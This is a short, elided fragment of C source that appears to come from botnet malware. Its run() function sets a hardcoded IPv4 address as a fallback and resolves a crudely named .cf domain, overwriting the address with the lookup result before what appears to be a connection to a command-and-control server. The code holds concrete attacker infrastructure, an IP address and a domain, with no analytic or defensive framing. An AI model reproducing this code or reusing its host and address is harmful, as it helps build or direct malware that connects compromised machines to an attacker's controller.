...
inline void run(void)
{
    ...
    addr.sin_addr.s_addr = INET_ADDR(107,189,30,191);

    struct hostent * hp = gethostbyname("suckmyass.cf");
    
    if( hp == NULL ) {

    	// domain didnt work? fall back to ip
    } else {
//    	printf("%s =", hp->h_name); // just exmaple to show name 	
    	 unsigned int i=0;
       while ( hp -> h_addr_list[i] != NULL) {
  //        printf( "%s ", inet_ntoa( *( struct in_addr*)( hp -> h_addr_list[i])));
          ///// OVERRIIDE IP ABOVE WITH RESULT
          addr.sin_addr.s_addr = (( struct in_addr*)( hp -> h_addr_list[i]))->s_addr;
          i++;
       }
    //   printf("\n");
    }
